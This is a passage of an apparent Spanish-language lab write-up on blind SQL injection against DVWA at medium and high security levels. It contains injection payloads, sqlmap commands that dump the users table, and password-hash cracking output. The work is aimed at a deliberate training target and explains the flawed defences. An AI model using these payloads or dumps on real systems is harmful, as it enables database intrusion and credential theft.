[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 46ms]
    * LETRA: 9
    * POSICION: 32

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 55ms]
    * LETRA: 9
    * POSICION: 31

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 110ms]
    * LETRA: 8
    * POSICION: 27

:: Progress: [1188/1188] :: Job [1/1] :: 213 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

> **Nota:** Este hash MD5 corresponde a la contraseña `password`. Para romperlo se pueden usar herramientas como `hashcat` o `john`, o buscarlo directamente en bases de datos de hashes conocidos (rainbow tables).

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 -a 0 5f4dcc3b5aa765d61d8327deb882cf99
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-AMD Ryzen 5 5600H with Radeon Graphics, 3950/7900 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
      For more information, see https://hashcat.net/faq/potfile

Started: Tue May 19 08:23:48 2026
Stopped: Tue May 19 08:23:49 2026
```

---

### Nivel de seguridad Medium

Con respecto al nivel `low` se observan dos cambios en el formulario:

- El campo de texto ha sido sustituido por una **lista desplegable**, donde el usuario elige el `id` del usuario.
- Se emplea el método **POST** para enviar la información al servidor.

Aunque el formulario limita las opciones visibles, mediante **Repeater de Burp Suite** es posible capturar, manipular y reenviar la solicitud indicando `id`s arbitrarios:

![Formulario de SQL injection blind](./imagenes/sql%20injection%20blind/06.png)

```bash
POST /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
Host: 192.168.100.4
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=m6hb716rh5rtqffdd87less7i9; security=medium

id=1&Submit=Submit
```

![Petición POST](./imagenes/sql%20injection%20blind/07.png)

La inyección de `'` provoca un error, confirmando la vulnerabilidad. Como `'` y `"` están bloqueadas (el código usa `mysqli_real_escape_string`), se prueban inyecciones sin comillas:

```sql
id=1#           --> EXISTS   (los comentarios anulan el resto de la consulta)
id=1 or 1=1#    --> EXISTS   (condición siempre verdadera)
```

> **Advertencia:** La protección mediante `mysqli_real_escape_string` no es suficiente si el parámetro no está entrecomillado en la consulta SQL. El código vulnerable es: `$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"` — al no tener comillas alrededor de `$id`, la inyección numérica funciona aunque se escapen los caracteres especiales.

Confirmada la vulnerabilidad, se automatiza todo el proceso con `sqlmap`.

---

#### Conexión con sqlmap (Medium)

`sqlmap` es una herramienta que automatiza el proceso de detección y explotación de vulnerabilidades SQLi. Permite entre otras cosas:

- Detección del SGBD (Sistema Gestor de Base de Datos)
- Extracción de datos
- Acceso al sistema de archivos del equipo
- Ejecución de comandos en el sistema operativo

Se captura con Burp Suite una petición POST y se guarda en un fichero `request_medium.txt`.

```bash
┌──(kali㉿kali)-[~]
└─$ cat request_medium.txt
POST /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
Host: 192.168.100.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://192.168.100.4
Connection: keep-alive
Referer: http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/
Cookie: security=medium; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1&Submit=Submit
```

| Parámetro        | Descripción                                              |
| ---------------- | -------------------------------------------------------- |
| `-r fichero.txt` | Usa un fichero de petición HTTP capturado con Burp Suite |
| `-u`             | URL objetivo                                             |
| `--data`         | Datos a enviar en la petición POST                       |
| `--cookie`       | Valor de la cabecera HTTP `Cookie`                       |
| `--dbs`          | Enumera las bases de datos disponibles                   |
| `-D <db>`        | Selecciona una base de datos específica                  |
| `--tables`       | Enumera las tablas de la base de datos seleccionada      |
| `-T <tabla>`     | Selecciona una tabla específica                          |
| `--columns`      | Enumera los campos de la tabla seleccionada              |
| `--dump`         | Extrae el contenido completo de la tabla                 |
| `-C col1,col2`   | Selecciona columnas específicas para el dump             |
| `--threads N`    | Número de hilos para acelerar la extracción              |

---

#### Descubrir bases de datos (Medium)

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_medium.txt --dbs

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.3#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:15:23 /2026-05-20/

...

sqlmap identified the following injection point(s) with a total of 3609 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1691=1691&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1292 FROM (SELECT(SLEEP(5)))aAlY)&Submit=Submit
---
[18:18:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:18:23] [INFO] fetching database names
[18:18:23] [INFO] fetching number of databases
[18:18:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:18:23] [INFO] retrieved: 2
[18:18:23] [INFO] retrieved: information_schema
[18:18:24] [INFO] retrieved: dvwa
available databases [2]:
[*] dvwa
[*] information_schema

[18:18:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 18:18:24 /2026-05-20/
```

`sqlmap` identifica automáticamente los puntos de inyección y los tipos (`boolean-based blind` y `time-based blind`), y descubre:

- SGBD: **MariaDB** (fork de MySQL >= 5.0.12)
- SO del servidor: **Linux Ubuntu 22.04**
- Servidor web: **Apache 2.4.58**
- Bases de datos: **`dvwa`**, **`information_schema`**

---

#### Tablas, campos y extracción (Medium)

Descubrir tablas pertenecientes a la base de datos _dvwa_.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_medium.txt -D dvwa --tables
...
[18:20:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:20:18] [INFO] fetching tables for database: 'dvwa'
[18:20:18] [INFO] fetching number of tables for database 'dvwa'
[18:20:18] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:20:18] [INFO] retrieved: 4
[18:20:18] [INFO] retrieved: security_log
[18:20:19] [INFO] retrieved: users
[18:20:19] [INFO] retrieved: guestbook
[18:20:20] [INFO] retrieved: access_log
Database: dvwa
[4 tables]
+--------------+
| access_log   |
| guestbook    |
| security_log |
| users        |
+--------------+

[18:20:21] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 18:20:21 /2026-05-20/
```

Descubrir campos de la tabla users.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_medium.txt -D dvwa -T users --columns
...
[18:21:27] [INFO] fetching columns for table 'users' in database 'dvwa'
[18:21:27] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:21:27] [INFO] retrieved: 10
[18:21:27] [INFO] retrieved: user_id
[18:21:27] [INFO] retrieved: int(6)
[18:21:28] [INFO] retrieved: first_name
[18:21:28] [INFO] retrieved: varchar(15)
[18:21:29] [INFO] retrieved: last_name
[18:21:30] [INFO] retrieved: varchar(15)
[18:21:31] [INFO] retrieved: user
[18:21:31] [INFO] retrieved: varchar(15)
[18:21:32] [INFO] retrieved: password
[18:21:32] [INFO] retrieved: varchar(32)
[18:21:33] [INFO] retrieved: avatar
[18:21:33] [INFO] retrieved: varchar(70)
[18:21:34] [INFO] retrieved: last_login
[18:21:35] [INFO] retrieved: timestamp
[18:21:35] [INFO] retrieved: failed_login
[18:21:37] [INFO] retrieved: int(3)
[18:21:37] [INFO] retrieved: role
[18:21:37] [INFO] retrieved: varchar(20)
[18:21:38] [INFO] retrieved: account_enabled
[18:21:39] [INFO] retrieved: tinyint(1)
Database: dvwa
Table: users
[10 columns]
+-----------------+-------------+
| Column          | Type        |
+-----------------+-------------+
| role            | varchar(20) |
| user            | varchar(15) |
| account_enabled | tinyint(1)  |
| avatar          | varchar(70) |
| failed_login    | int(3)      |
| first_name      | varchar(15) |
| last_login      | timestamp   |
| last_name       | varchar(15) |
| password        | varchar(32) |
| user_id         | int(6)      |
+-----------------+-------------+

[18:21:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 18:21:40 /2026-05-20/
```

Extraer contenido completo de las tablas y ataque sobre las contraseñas.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_medium.txt -D dvwa -T users --dump

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.3#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:23:33 /2026-05-20/

[18:23:33] [INFO] parsing HTTP request from 'request_medium.txt'
[18:23:33] [INFO] resuming back-end DBMS 'mysql'
[18:23:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1691=1691&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1292 FROM (SELECT(SLEEP(5)))aAlY)&Submit=Submit
---
[18:23:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:23:33] [INFO] fetching columns for table 'users' in database 'dvwa'
[18:23:33] [INFO] resumed: 10
[18:23:33] [INFO] resumed: user_id
[18:23:33] [INFO] resumed: first_name
[18:23:33] [INFO] resumed: last_name
[18:23:33] [INFO] resumed: user
[18:23:33] [INFO] resumed: password
[18:23:33] [INFO] resumed: avatar
[18:23:33] [INFO] resumed: last_login
[18:23:33] [INFO] resumed: failed_login
[18:23:33] [INFO] resumed: role
[18:23:33] [INFO] resumed: account_enabled
[18:23:33] [INFO] fetching entries for table 'users' in database 'dvwa'
[18:23:33] [INFO] fetching number of entries for table 'users' in database 'dvwa'
[18:23:33] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:23:33] [INFO] retrieved: 5
[18:23:34] [INFO] retrieved: admin
[18:23:34] [INFO] retrieved: admin
[18:23:34] [INFO] retrieved: 1
[18:23:34] [INFO] retrieved: /dvwa/hackable/users/admin.jpg
[18:23:36] [INFO] retrieved: 2
[18:23:36] [INFO] retrieved: admin
[18:23:37] [INFO] retrieved: 2026-04-27 16:05:12
[18:23:38] [INFO] retrieved: admin
[18:23:38] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[18:23:41] [INFO] retrieved: 1
[18:23:41] [INFO] retrieved: user
[18:23:41] [INFO] retrieved: smithy
[18:23:41] [INFO] retrieved: 1
[18:23:42] [INFO] retrieved: /dvwa/hackable/users/smithy.jpg
[18:23:43] [INFO] retrieved: 0
[18:23:44] [INFO] retrieved: Bob
[18:23:44] [INFO] retrieved: 2026-04-24 09:50:14
[18:23:45] [INFO] retrieved: Smith
[18:23:45] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[18:23:48] [INFO] retrieved: 5
[18:23:48] [INFO] retrieved: user
[18:23:48] [INFO] retrieved: 1337
[18:23:48] [INFO] retrieved: 1
[18:23:48] [INFO] retrieved: /dvwa/hackable/users/1337.jpg
[18:23:50] [INFO] retrieved: 0
[18:23:50] [INFO] retrieved: Hack
[18:23:50] [INFO] retrieved: 2026-04-24 09:50:14
[18:23:52] [INFO] retrieved: Me
[18:23:52] [INFO] retrieved: 8d3533d75ae2c3966d7e0d4fcc69216b
[18:23:54] [INFO] retrieved: 3
[18:23:54] [INFO] retrieved: user
[18:23:55] [INFO] retrieved: pablo
[18:23:55] [INFO] retrieved: 1
[18:23:55] [INFO] retrieved: /dvwa/hackable/users/pablo.jpg
[18:23:57] [INFO] retrieved: 0
[18:23:57] [INFO] retrieved: Pablo
[18:23:57] [INFO] retrieved: 2026-04-24 09:50:14
[18:23:59] [INFO] retrieved: Picasso
[18:23:59] [INFO] retrieved: 0d107d09f5bbe40cade3de5c71e9e9b7
[18:24:02] [INFO] retrieved: 4
[18:24:02] [INFO] retrieved: user
[18:24:02] [INFO] retrieved: smithy
[18:24:03] [INFO] retrieved: 1
[18:24:03] [INFO] retrieved: /dvwa/hackable/users/smithy.jpg
[18:24:05] [INFO] retrieved: 0
[18:24:05] [INFO] retrieved: Bob
[18:24:05] [INFO] retrieved: 2026-04-24 09:50:14
[18:24:08] [INFO] retrieved: Smith
[18:24:08] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[18:24:13] [INFO] retrieved: 5
[18:24:13] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[18:24:24] [INFO] writing hashes to a temporary file '/tmp/sqlmap09bti3gx124793/sqlmaphashes-a5185d9q.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[18:24:37] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[18:24:45] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[18:24:49] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[18:24:49] [INFO] starting 8 processes
[18:24:51] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
[18:24:52] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
[18:24:53] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
[18:24:55] [INFO] using suffix '1'
[18:25:00] [INFO] using suffix '123'
[18:25:06] [INFO] using suffix '2'
[18:25:15] [INFO] using suffix '12'
[18:25:23] [INFO] using suffix '3'
[18:25:32] [INFO] using suffix '13'
[18:25:40] [INFO] using suffix '7'
[18:25:48] [INFO] using suffix '11'
[18:25:56] [INFO] using suffix '5'
[18:26:04] [INFO] using suffix '22'
[18:26:12] [INFO] using suffix '23'
[18:26:19] [INFO] using suffix '01'
[18:26:24] [INFO] using suffix '4'
[18:26:30] [INFO] using suffix '07'
[18:26:35] [INFO] using suffix '21'
[18:26:41] [INFO] using suffix '14'
[18:26:49] [INFO] using suffix '10'
[18:26:57] [INFO] using suffix '06'
[18:27:05] [INFO] using suffix '08'
[18:27:13] [INFO] using suffix '8'
[18:27:21] [INFO] using suffix '15'
[18:27:29] [INFO] using suffix '69'
[18:27:37] [INFO] using suffix '16'
[18:27:45] [INFO] using suffix '6'
[18:27:53] [INFO] using suffix '18'
[18:28:01] [INFO] using suffix '!'
[18:28:09] [INFO] using suffix '.'
[18:28:18] [INFO] using suffix '*'
[18:28:26] [INFO] using suffix '!!'
[18:28:34] [INFO] using suffix '?'
[18:28:42] [INFO] using suffix ';'
[18:28:49] [INFO] using suffix '..'
[18:28:56] [INFO] using suffix '!!!'
[18:29:02] [INFO] using suffix ','
[18:29:08] [INFO] using suffix '@'
Database: dvwa
Table: users
[5 entries]
+---------+--------+--------+---------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
| user_id | role   | user   | avatar                          | password                                    | last_name | first_name | last_login          | failed_login | account_enabled |
+---------+--------+--------+---------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
| 1       | admin  | admin  | /dvwa/hackable/users/admin.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-04-27 16:05:12 | 2            | 1               |
| 5       | user   | smithy | /dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-04-24 09:50:14 | 0            | 1               |
| 3       | user   | 1337   | /dvwa/hackable/users/1337.jpg   | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-04-24 09:50:14 | 0            | 1               |
| 4       | user   | pablo  | /dvwa/hackable/users/pablo.jpg  | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-04-24 09:50:14 | 0            | 1               |
| 5       | user   | smithy | /dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-04-24 09:50:14 | 0            | 1               |
+---------+--------+--------+---------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+

[18:29:15] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.100.4/dump/dvwa/users.csv'
[18:29:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 18:29:15 /2026-05-20/

```

Tablas encontradas: **`users`**, **`guestbook`**, **`access_log`**, **`security_log`**.

Campos de la tabla `users`: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login`, `failed_login`, `role`, `account_enabled`.

Con el parámetro `--dump` podemos averiguar las contraseñas de los usuarios mediante un ataque de fuerza bruta.

---

#### Hashcracking (Medium)

`sqlmap` reconoce automáticamente los hashes MD5 durante el `dump` y ofrece la posibilidad de romper las contraseñas mediante ataque de diccionario con su propio wordlist:

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_medium.txt -D dvwa -T users -C user,password --dump
...
```

Durante la ejecución se selecciona el diccionario por defecto de `sqlmap` y se obtienen las contraseñas en texto plano:

| Usuario   | Hash MD5                           | Contraseña |
| --------- | ---------------------------------- | ---------- |
| `1337`    | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley`  |
| `admin`   | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| `gordonb` | `e99a18c428cb38d5f260853678922e03` | `abc123`   |
| `pablo`   | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein`  |
| `smithy`  | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

Además del output en pantalla, `sqlmap` guarda un fichero CSV en `/home/kali/.local/share/sqlmap/output/192.168.100.4/dump/dvwa/users.csv`.

```bash
┌──(kali㉿kali)-[~]
└─$ cat  .local/share/sqlmap/output/192.168.100.4/dump/dvwa/users.csv
user_id,role,user,avatar,password,last_name,first_name,last_login,failed_login,account_enabled
1,admin,admin,/dvwa/hackable/users/admin.jpg,5f4dcc3b5aa765d61d8327deb882cf99 (password),admin,admin,2026-04-27 16:05:12,2,1
5,user,smithy,/dvwa/hackable/users/smithy.jpg,5f4dcc3b5aa765d61d8327deb882cf99 (password),Smith,Bob,2026-04-24 09:50:14,0,1
3,user,1337,/dvwa/hackable/users/1337.jpg,8d3533d75ae2c3966d7e0d4fcc69216b (charley),Me,Hack,2026-04-24 09:50:14,0,1
4,user,pablo,/dvwa/hackable/users/pablo.jpg,0d107d09f5bbe40cade3de5c71e9e9b7 (letmein),Picasso,Pablo,2026-04-24 09:50:14,0,1
5,user,smithy,/dvwa/hackable/users/smithy.jpg,5f4dcc3b5aa765d61d8327deb882cf99 (password),Smith,Bob,2026-04-24 09:50:14,0,1
```

> **Advertencia:** Toda la actividad de `sqlmap` queda reflejada en los **logs del servidor web** (`/var/log/apache2/access.log`) y se puede ver haciendo una búsqueda por _sqlmap_. El volumen de peticiones generadas es muy elevado y fácilmente detectable por un IDS/IPS o un WAF.

---

### Nivel de seguridad High

Tras configurar el nivel de seguridad en DVWA a `high`, aparece un enlace que abre **una nueva ventana** a través de la que se puede introducir el `id` de un usuario. El mecanismo de funcionamiento es diferente a los niveles anteriores:

1. El formulario en `/dvwa/vulnerabilities/sqli_blind/cookie-input.php` envía el `id` mediante **POST**.
2. El valor del `id` se guarda en una **cookie**.
3. La página `/dvwa/vulnerabilities/sqli_blind/` lee el `id` de esa cookie y muestra el mensaje correspondiente.

![Ventana emergente nivel de seguridad alto](./imagenes/sql%20injection%20blind/08.png)

![Respuesta](./imagenes/sql%20injection%20blind/09.png)

Al revisar las peticiones con Burp Suite se observa que el valor introducido aparece en la cabecera `Cookie` de la petición GET:

```bash
GET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
Cookie: id=1; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
```

![Petición POST](./imagenes/sql%20injection%20blind/10.png)

> **Importante:** El punto de inyección no está en un parámetro GET/POST sino en la **cookie**. Esto dificulta la detección y explotación manual, y requiere configurar las herramientas para que trabajen a nivel de cabeceras HTTP.

Modificando manualmente el valor de la cookie desde Repeater se comprueba que se puede manipular el comportamiento de la aplicación. Se confirma la vulnerabilidad SQLi Boolean Based con payloads como:

```sql
id=1' and 1=2 #   --> MISSING  (condición falsa anula el resultado)
id=9' or 1=1 #    --> EXISTS   (condición siempre verdadera)
```

También se puede verificar el comportamiento **time-based**:

```sql
1' and sleep(15)#  --> retardo de 15s (id=1 existe, se ejecuta el sleep)
9' and sleep(15)#  --> respuesta inmediata (id=9 no existe, no se ejecuta el sleep)
```

En caso de fallo, la aplicación introduce un retardo aleatorio como mecanismo de defensa para dificultar las pruebas de tiempo de respuesta.

---

#### Conexión con sqlmap (High)

Se guarda la petición GET con la cookie desde Burp Suite en un fichero `request_high.txt`. Como el punto de inyección está en la **cookie**, es necesario indicarle a `sqlmap` que trabaje a **nivel 2 o superior**:

```bash
sqlmap -r request_high.txt --dbs --level=2
```

| Parámetro   | Descripción                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------- |
| `--level=2` | Necesario para que `sqlmap` compruebe los valores de la cabecera HTTP `Cookie` (por defecto solo comprueba GET y POST) |
| `-p id`     | Opcional: indica explícitamente el parámetro a inspeccionar                                                            |

Durante el asistente se responde `n` a la pregunta `do you want to try URI injections in the target URL itself?`.

![Petición GET](./imagenes/sql%20injection%20blind/11.png)

---

#### Descubrir bases de datos (High)

Una vez capturada la petición y almacenada se procede con el ataque de _sqlmap_.

```bash
┌──(kali㉿kali)-[~]
└─$ cat request_high.txt
GET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
Host: 192.168.100.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.100.4/dvwa/index.php
Connection: keep-alive
Cookie: id=1; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_high.txt --dbs --level=2
...
---
Parameter: id (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5367=5367 AND 'zaxq'='zaxq; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1508 FROM (SELECT(SLEEP(5)))Ussk) AND 'XRya'='XRya; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
---
[19:27:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:27:46] [INFO] fetching database names
[19:27:46] [INFO] fetching number of databases
[19:27:46] [INFO] resumed: 2
[19:27:46] [INFO] resumed: information_schema
[19:27:46] [INFO] resumed: dvwa
available databases [2]:
[*] dvwa
[*] information_schema

[19:27:46] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 499 times, 403 (Forbidden) - 1 times
[19:27:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 19:27:46 /2026-05-20/
```

`sqlmap` identifica el punto de inyección en la cookie `id` y descubre:

- Tipos de inyección: `boolean-based blind` y `time-based blind`
- SGBD: **MariaDB** (MySQL >= 5.0.12)
- Bases de datos: **`dvwa`**, **`information_schema`**

---

#### Tablas, campos y extracción (High)

```bash
# Descubrir tablas
──(kali㉿kali)-[~]
└─$ sqlmap -r request_high.txt -D dvwa --tables --level=2

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.3#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:28:18 /2026-05-20/

[19:28:18] [INFO] parsing HTTP request from 'request_high.txt'
[19:28:18] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:28:20] [INFO] resuming back-end DBMS 'mysql'
[19:28:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5367=5367 AND 'zaxq'='zaxq; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1508 FROM (SELECT(SLEEP(5)))Ussk) AND 'XRya'='XRya; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
---
[19:28:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:28:20] [INFO] fetching tables for database: 'dvwa'
[19:28:20] [INFO] fetching number of tables for database 'dvwa'
[19:28:20] [INFO] resumed: 4
[19:28:20] [INFO] resumed: security_log
[19:28:20] [INFO] resumed: users
[19:28:20] [INFO] resumed: guestbook
[19:28:20] [INFO] resumed: access_log
Database: dvwa
[4 tables]
+--------------+
| access_log   |
| guestbook    |
| security_log |
| users        |
+--------------+

[19:28:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 19:28:20 /2026-05-20/
```

```bash
# Descubrir campos
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_high.txt -D dvwa -T users --columns --level=2

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:31:43 /2026-05-20/

[19:31:43] [INFO] parsing HTTP request from 'request_high.txt'
[19:31:43] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:31:44] [INFO] resuming back-end DBMS 'mysql'
[19:31:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5367=5367 AND 'zaxq'='zaxq; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1508 FROM (SELECT(SLEEP(5)))Ussk) AND 'XRya'='XRya; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
---
[19:31:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:31:44] [INFO] fetching columns for table 'users' in database 'dvwa'
[19:31:44] [INFO] resumed: 10
[19:31:44] [INFO] resumed: user_id
[19:31:44] [INFO] resumed: int(6)
[19:31:44] [INFO] resumed: first_name
[19:31:44] [INFO] resumed: varchar(15)
[19:31:44] [INFO] resumed: last_name
[19:31:44] [INFO] resumed: varchar(15)
[19:31:44] [INFO] resumed: user
[19:31:44] [INFO] resumed: varchar(15)
[19:31:44] [INFO] resumed: password
[19:31:44] [INFO] resumed: varchar(32)
[19:31:44] [INFO] resumed: avatar
[19:31:44] [INFO] resumed: varchar(70)
